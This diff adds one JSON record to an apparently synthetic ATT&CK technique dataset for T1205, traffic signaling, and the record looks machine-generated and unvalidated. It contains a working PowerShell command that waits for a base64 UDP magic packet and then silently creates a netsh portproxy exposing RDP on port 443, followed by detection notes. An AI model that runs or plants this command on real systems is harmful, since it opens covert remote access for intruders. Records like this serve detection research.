@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $port=49160; $udp=New-Object System.Net.Sockets.UdpClient($port); $ep=New-Object System.Net.IPEndPoint([IPAddress]::Any,0); $data=$udp.Receive([ref]$ep); $udp.Close(); $msg=[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String([Text.Encoding]::ASCII.GetString($data))); if($msg -eq 'OPENPROXY:443->3389'){ Start-Process -FilePath 'netsh' -ArgumentList 'interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1' -WindowStyle Hidden -Verb RunAs | Out-Null } }",
+  "explanation": "Listens for a single UDP magic packet (base64) and, upon matching 'OPENPROXY:443->3389', creates a portproxy to forward 443 to local 3389, effectively exposing RDP via TLS port (traffic signaling to enable access). Detection: monitor netsh portproxy changes and new listeners on 443; detect UDP to high ephemeral ports with base64 content; require admin/UAC elevation to create portproxy.",
+  "rationale_steps": [
+    "Receive a magic packet and decode base64 instruction.",
+    "On match, use netsh portproxy to expose a hidden service via a common port.",
+    "Highlight detection via auditing netsh configuration changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-41a9035c",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
